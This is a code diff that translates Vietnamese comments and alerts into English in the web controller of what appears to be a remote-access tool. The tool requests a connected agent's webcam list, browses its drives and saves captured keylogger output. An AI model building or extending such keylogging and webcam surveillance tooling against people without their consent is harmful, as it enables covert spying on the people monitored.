@@ -373,11 +373,11 @@
             getProcesses();
             getApplications();
             
-            // Tự động yêu cầu danh sách Webcam khi vừa chọn máy mới
+            // Automatically request Webcam list upon connecting to new Agent
             document.getElementById('webcam-select').innerHTML = '<option value="">Loading cameras...</option>';
             connection.invoke("RequestWebcams", currentTargetId).catch(err => console.error(err));
 
-            // Load danh sách ổ đĩa mặc định
+            // Load default drives list
             requestDirectoryContents("");
         }
 
@@ -530,7 +530,7 @@
         async function saveKeylog() {
             const textToSave = agentKeylogs[currentTargetId] || "";
             if (!textToSave || textToSave.trim() === "> Keylogger not started yet..." || textToSave.trim() === "") {
-                alert("Không có gì để lưu!");
+                alert("Nothing to save!");
                 return;
             }
 
@@ -554,10 +554,10 @@
                     document.body.removeChild(a);
                     window.URL.revokeObjectURL(url);
                 }
-                alert("Lưu file Keylog thành công!");
+                alert("Keylog saved successfully!");
             } catch (err) {
                 if (err.name !== 'AbortError') {
-                    alert("Lỗi khi lưu file: " + err.message);
+                    alert("Error saving file: " + err.message);
                 }
             }
         }
@@ -754,7 +754,7 @@
                 const blob = new Blob([byteArray], {type: "application/octet-stream"});
 
                 if (window.showSaveFilePicker) {
-                    // Mở hộp thoại "Save As" chuyên nghiệp (chỉ hỗ trợ trên Chrome/Edge/Opera đời mới)
+                    // Modern "Save As" dialog (supported on modern Chrome/Edge/Opera)
                     const opts = { suggestedName: fileName };
                     const handle = await window.showSaveFilePicker(opts);
                     const writable = await handle.createWritable();
@@ -762,7 +762,7 @@
                     await writable.close();
                     document.getElementById("file-download-status").textContent = "File saved successfully!";
                 } else {
-                    // Cách cổ điển: Tải thẳng vào thư mục Downloads cho các trình duyệt cũ
+                    // Classic fallback: Download directly to Downloads folder
                     const url = window.URL.createObjectURL(blob);
                     const a = document.createElement('a');
                     a.href = url;
